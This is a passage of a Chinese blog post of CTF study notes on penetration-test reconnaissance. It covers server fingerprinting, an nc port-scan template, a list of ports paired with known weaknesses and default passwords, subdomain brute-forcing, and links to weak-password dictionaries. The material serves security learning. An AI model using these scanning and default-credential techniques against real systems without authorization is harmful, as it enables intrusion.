+延伸练习: 建议结合MS08-067等漏洞进行综合渗透测试练习</p>
+<h2 id="8-信息收集"><a class="markdownIt-Anchor" href="#8-信息收集"></a> 8、信息收集</h2>
+<h3 id="操作系统识别方法"><a class="markdownIt-Anchor" href="#操作系统识别方法"></a> 操作系统识别方法</h3>
+<h4 id="f12"><a class="markdownIt-Anchor" href="#f12"></a> F12</h4>
+<ul>
+<li>Network标签页刷新页面获取请求记录，查看响应头中的Server字段<br />
+例子：</li>
+<li>Windows系统识别
+<ul>
+<li>识别特征：
+<ul>
+<li>Server字段包含&quot;Microsoft-IIS&quot;</li>
+<li>X-Powered-By字段显示&quot;<a target="_blank" rel="noopener" href="http://ASP.NET">ASP.NET</a>&quot;</li>
+</ul>
+</li>
+<li>典型配置：
+<ul>
+<li>操作系统：Windows Server</li>
+<li>中间件：IIS</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Linux系统识别
+<ul>
+<li>识别特征：
+<ul>
+<li>Server字段包含&quot;Apache&quot;</li>
+<li>无明显的Windows特有标识</li>
+</ul>
+</li>
+<li>版本确认：
+<ul>
+<li>通过响应头特殊字段查询（如Debian）</li>
+<li>使用搜索引擎验证系统特征</li>
+</ul>
+</li>
+<li>典型配置：
+<ul>
+<li>操作系统：Debian Linux</li>
+<li>中间件：Apache</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="中间件识别技巧"><a class="markdownIt-Anchor" href="#中间件识别技巧"></a> 中间件识别技巧</h3>
+<ul>
+<li>常见类型：
+<ul>
+<li>Apache（跨平台，常见于Linux）</li>
+<li>IIS（Windows专属）</li>
+<li>Nginx（高性能Web服务器）</li>
+</ul>
+</li>
+<li>识别要点：
+<ul>
+<li>响应头中的Server字段</li>
+<li>X-Powered-By字段补充信息</li>
+<li>特定URL路径特征</li>
+</ul>
+</li>
+</ul>
+<h3 id="语言"><a class="markdownIt-Anchor" href="#语言"></a> 语言</h3>
+<ul>
+<li>搜索引擎
+<ul>
+<li>网站地址+技术关键词（如PHP/JSP）进行搜索</li>
+</ul>
+</li>
+</ul>
+<h3 id="源代码收集"><a class="markdownIt-Anchor" href="#源代码收集"></a> 源代码收集</h3>
+<ul>
+<li>收集目的：确定网站使用的CMS或框架类型</li>
+<li>主要方法：
+<ul>
+<li>查看网页源代码中的特征文件路径（如wp-content）</li>
+<li>使用开发者工具分析网络请求</li>
+<li>搜索引擎查询特征字符串
+<ul>
+<li>特征文件：wp-content和wp-includes目录是WordPress的典型特征</li>
+<li>关联信息：WordPress通常使用PHP+MySQL技术栈</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="数据库信息收集"><a class="markdownIt-Anchor" href="#数据库信息收集"></a> 数据库信息收集</h3>
+<p>推断方法：</p>
+<ul>
+<li>根据CMS类型推断（WordPress通常使用MySQL）</li>
+<li>通过网站错误信息获取</li>
+<li>使用专业工具扫描<br />
+ping拿到ip地址</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\luoyinhui&gt;ping baidu.com</span><br><span class="line">正在 Ping baidu.com [111.63.65.103] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure>
+<p>nc扫描：nc -n -v -w1 -z [IP] [端口列表]</p>
+<h3 id="常见端口"><a class="markdownIt-Anchor" href="#常见端口"></a> 常见端口</h3>
+<ol>
+<li>web类(web漏洞/敏感目录)<br />
+80 web<br />
+80-89 web<br />
+8000-9090 web</li>
+<li>数据库类<br />
+1433 MSSQL<br />
+1521 Oracle<br />
+3306 MySQL<br />
+5432 PostgreSQL</li>
+<li>特殊服务类<br />
+443 SSL心脏滴血<br />
+873 Rsync未授权<br />
+5984 CouchDB <a target="_blank" rel="noopener" href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br />
+6379 redis未授权<br />
+7001,7002 WebLogic默认弱口令，反序列<br />
+9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br />
+11211 memcache未提权访问<br />
+27017,27018 MongoDB未授权访问<br />
+50000 SAP命令行执行<br />
+50070,50030 hadoop认证端口未授权访问</li>
+<li>常用端口类<br />
+21 ftp<br />
+22 SSH<br />
+23 Telnet<br />
+2601,2604 zebra路由，默认密码zebra<br />
+3389 远程桌面</li>
+</ol>
+<h3 id="域名"><a class="markdownIt-Anchor" href="#域名"></a> 域名</h3>
+<p>在线工具：</p>
+<ul>
+<li>站长之家子域名查询工具(<a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain">tool.chinaz.com/subdomain</a>)</li>
+<li>IP138子域名查询(<a target="_blank" rel="noopener" href="http://site.ip138.com">site.ip138.com</a>)</li>
+<li>查子域(<a target="_blank" rel="noopener" href="http://chaziyu.com">chaziyu.com</a>)<br />
+子域名爆破工具subDomainsBrute</li>
+<li>例子：
+<ul>
+<li>创建20个线程访问百度，将结果保存到baidu.txt</li>
+<li><code>python subDomainsBrute.py -t 20 http://baidu.com -o baidu.txt</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="9-弱口令"><a class="markdownIt-Anchor" href="#9-弱口令"></a> 9、弱口令</h2>
+<ul>
+<li>github项目：
+<ul>
+<li>弱口令字典：<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
+<li>默认账密资料：<a target="_blank" rel="noopener" href="https://github.com/yijinglab/DefaultCreds-cheat-sheet">https://github.com/yijinglab/DefaultCreds-cheat-sheet</a></li>
+</ul>
+</li>
+<li>网站：
+<ul>
+<li>电话号码查注册账户：<a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a></li>
+<li>字典下载+社工密码创建：<a target="_blank" rel="noopener" href="https://weakpass.com/">https://weakpass.com/</a></li>
+</ul>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://luoyinhui.github.io">luoyinhui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://luoyinhui.github.io/posts/c9562409/">https://luoyinhui.github.io/posts/c9562409/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://luoyinhui.github.io" target="_blank">落殷回的博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/shouye.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css?v=1.1.6" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js?v=1.1.6" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/weixin.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/weixin.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zhifubao.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/33942c59/" title="【比赛】2026启航杯"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="onerror=null;src='/img/404.webp'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">【比赛】2026启航杯</div></div><div class="info-2"><div class="info-item-1"> misc  兄弟你好香 179 pts 听说你很会闻味道？那就来闻闻这张图片和这段音频里藏着什么秘密吧~ 提交方式：QHCTF{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}  图片后提出来是zip 解压  === 兄弟，你好香啊 ===恭喜你找到了这个文件！但flag还需要解密...提示:1. 密文经过了三层加密2. 最外层是ROT133. 中间层是Base64  4. 最内层是AES-ECB，密钥与&quot;兄弟你好香&quot;的英文有关5. 密钥长度为16字节加密后的flag:ygy/AONrj8D+kjqBg2F/nxJARXoKft85oRsiQAjhORFPjtvh2aC3aBiGQAHUNm1N祝你好运，香香的兄弟！ 明文密钥BrotherYouSmell! from Crypto.Cipher import AESimport base64,codecsct=base64.b64decode(codecs.decode(&quot;ygy/AONrj8D+kjqBg2F/nxJARXoKft85oRsiQAjhORFPjtvh2a...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="avatar"/></div><div class="author-info-name">luoyinhui</div><div class="author-info-description">记录踩坑与瞎折腾，由Hexo+Github搭建</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/luoyinhui"><i class="fab fa-github"></i><span>Follow Me</span></a><a class="card-info-btn" href="/subscribe"><i class="fas fa-rss"></i><span>订阅RSS</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%BB%BD%E8%B5%84%E6%96%99"><span class="toc-text"> 第一份资料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%93%8D%E4%B8%8E%E5%AE%9E%E6%88%98"><span class="toc-text"> 7、渗透测试工具实操与实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kali-msfconsole"><span class="toc-text"> kali msfconsole</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap"><span class="toc-text"> nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-text"> 漏洞攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-text"> 具体操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ms10-046%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="toc-text"> Ms10-046漏洞攻击演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ms12-020%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="toc-text"> MS12-020漏洞攻击演示</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 8、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB%E6%96%B9%E6%B3%95"><span class="toc-text"> 操作系统识别方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#f12"><span class="toc-text"> F12</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%AF%86%E5%88%AB%E6%8A%80%E5%B7%A7"><span class="toc-text"> 中间件识别技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E8%A8%80"><span class="toc-text"> 语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E6%94%B6%E9%9B%86"><span class="toc-text"> 源代码收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 数据库信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3"><span class="toc-text"> 常见端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-text"> 域名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text"> 9、弱口令</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/c9562409/" title="【备赛】2026楚慧杯准备"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【备赛】2026楚慧杯准备"/></a><div class="content"><a class="title" href="/posts/c9562409/" title="【备赛】2026楚慧杯准备">【备赛】2026楚慧杯准备</a><time datetime="2026-02-10T05:03:32.000Z" title="发表于 2026-02-10 13:03:32">2026-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/33942c59/" title="【比赛】2026启航杯"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【比赛】2026启航杯"/></a><div class="content"><a class="title" href="/posts/33942c59/" title="【比赛】2026启航杯">【比赛】2026启航杯</a><time datetime="2026-02-08T00:45:35.000Z" title="发表于 2026-02-08 08:45:35">2026-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d2f13365/" title="【代码笔记】c语言"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【代码笔记】c语言"/></a><div class="content"><a class="title" href="/posts/d2f13365/" title="【代码笔记】c语言">【代码笔记】c语言</a><time datetime="2026-02-05T13:39:39.000Z" title="发表于 2026-02-05 21:39:39">2026-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/19b72c89/" title="【刷题】newstar-re方向"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【刷题】newstar-re方向"/></a><div class="content"><a class="title" href="/posts/19b72c89/" title="【刷题】newstar-re方向">【刷题】newstar-re方向</a><time datetime="2026-02-05T12:53:21.000Z" title="发表于 2026-02-05 20:53:21">2026-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/515cbad1/" title="A1CTF靶场搭建"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="A1CTF靶场搭建"/></a><div class="content"><a class="title" href="/posts/515cbad1/" title="A1CTF靶场搭建">A1CTF靶场搭建</a><time datetime="2026-02-04T09:04:21.000Z" title="发表于 2026-02-04 17:04:21">2026-02-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By luoyinhui</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.0"></script><script src="/js/main.js?v=5.5.0"></script><script src="/pluginsSrc/medium-zoom/dist/medium-zoom.min.js?v=1.1.0"></script><script src="/pluginsSrc/vanilla-lazyload/dist/lazyload.iife.min.js?v=19.1.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-vercel01.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://twikoo-vercel01.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('/pluginsSrc/twikoo/dist/twikoo.all.min.js?v=1.6.44').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script id="click-heart" src="/pluginsSrc/butterfly-extsrc/dist/click-heart.min.js?v=1.1.6" async="async" mobile="false"></script><link rel="stylesheet" href="/pluginsSrc/aplayer/dist/APlayer.min.css?v=1.10.1" media="print" onload="this.media='all'"><script src="/pluginsSrc/aplayer/dist/APlayer.min.js?v=1.10.1"></script><script src="/pluginsSrc/butterfly-extsrc/metingjs/dist/Meting.min.js?v=1.1.6"></script><div class="aplayer no-destroy" id="global-aplayer"></div><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script>(function(){
+  if (window.__globalAPlayer__) return;
+  function init(){
+    var el=document.getElementById('global-aplayer');
+    if (!el || !window.APlayer) { setTimeout(init, 100); return; }
+    window.__globalAPlayer__ = new APlayer({
+      container: el,
+      fixed: true,
+      autoplay: false,
+      preload: 'none',
+      storageName: 'aplayer-setting-global',
+      lrcType: 0,
+      audio: [{
+        name: '簇拥烈日的花 - 迟里乌布',
+        artist: 'Unknown',
+        url: '/audio/flower.flac',
+        cover: '/img/music-cover.png',
+        type: 'auto'
+      }]
+    });
+    try { window.__globalAPlayer__.audio && (window.__globalAPlayer__.audio.playbackRate = 1) } catch(e){}
+  }
+  init();
+})()</script><script src="/pluginsSrc/pjax/pjax.min.js?v=0.2.8"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-switch"><span class="search-switch-item active" data-type="local">本地搜索</span><span class="search-switch-item" data-type="algolia">Algolia</span></div><div id="local-search-panel"><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="algolia-search-panel" style="display:none"><div id="algolia-search-input"><div class="ais-SearchBox"><form class="ais-SearchBox-form" action="" role="search" novalidate=""><input class="ais-SearchBox-input" type="search" placeholder="搜索文章" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="512" aria-label="Search"><button class="ais-SearchBox-submit" type="submit" title="Submit the search query" style="display:none;"><svg class="ais-SearchBox-submitIcon" width="10" height="10" viewBox="0 0 40 40" aria-hidden="true"><path d="M26.804 29.01c-2.832 2.34-6.465 3.746-10.426 3.746C7.333 32.756 0 25.424 0 16.378 0 7.333 7.333 0 16.378 0c9.046 0 16.378 7.333 16.378 16.378 0 3.96-1.406 7.594-3.746 10.426l10.534 10.534c.607.607.61 1.59-.004 2.202-.61.61-1.597.61-2.202.004L26.804 29.01zm-10.426.627c7.323 0 13.26-5.936 13.26-13.26 0-7.32-5.937-13.257-13.26-13.257C9.056 3.12 3.12 9.056 3.12 16.378c0 7.323 5.936 13.26 13.258 13.26z"></path></svg></button></form></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"><div id="algolia-hits-empty" style="display:none;"></div><div class="ais-Hits" style="display:none;"><ol class="ais-Hits-list"></ol></div></div></div><div class="ais-Pagination" id="algolia-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="algolia-info"><span class="ais-Stats-text"></span><span class="algolia-poweredBy-text">Search powered by Algolia</span></div></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.0"></script><script src="/pluginsSrc/algoliasearch/dist/lite/builds/browser.umd.js?v=5.37.0"></script><script src="/js/search/algolia.js?v=5.5.0"></script></div><!-- hexo injector body_end start --><script>window.toggleHistory = function(btn) {
+  var history = document.getElementById('updates-history');
+  if (history.style.display === 'none') {
+    history.style.display = 'block';
+    btn.innerText = '收起';
+  } else {
+    history.style.display = 'none';
+    btn.innerText = '显示更多';
+  }
+}
+</script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item swiper-outer" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="background:url(../assets/preview.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-12-30</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/35b57171/&quot;);" href="javascript:void(0);" alt="">【项目】hexo-butterfly-updates-heatmap插件介绍</a><div class="blog-slider__text">参考语雀热力图制作的hexo热力图插件~~（嘶后面发现和github热力图也很像）</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-10-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/ef1d4e7/&quot;);" href="javascript:void(0);" alt="">【笔记】markdown-github+vscode使用文档</a><div class="blog-slider__text">markdown语法在基于github+vscode背景下的使用与探索笔记</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-12-31</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/989aec00/&quot;);" href="javascript:void(0);" alt="">【刷题】青少年靶场练习</a><div class="blog-slider__text">初步接触应急响应题目，跟随强帝步伐嘻嘻~~</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-08-16</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/c3315bb0/&quot;);" href="javascript:void(0);" alt="">【笔记】十六进制文件头尾特征</a><div class="blog-slider__text">重要的misc知识点！！！</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-11-28</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f2309c58/&quot;);" href="javascript:void(0);" alt="">任务清单</a><div class="blog-slider__text">什么？！我还有那么多活没干呀，快干！！！</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2026-01-02</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/eb9d2e41/&quot;);" href="javascript:void(0);" alt="">阶段小结</a><div class="blog-slider__text">乱七八糟没有逻辑的反思，要是不小心折磨了你的眼睛非常抱歉ㅍ_ㅍ</div></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div><div class="swiper-button-prev"></div><div class="swiper-button-next"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = '/links/,/link/'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="/js/swiper/swiper.min.js"></script><script defer data-pjax src="/js/swiper/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
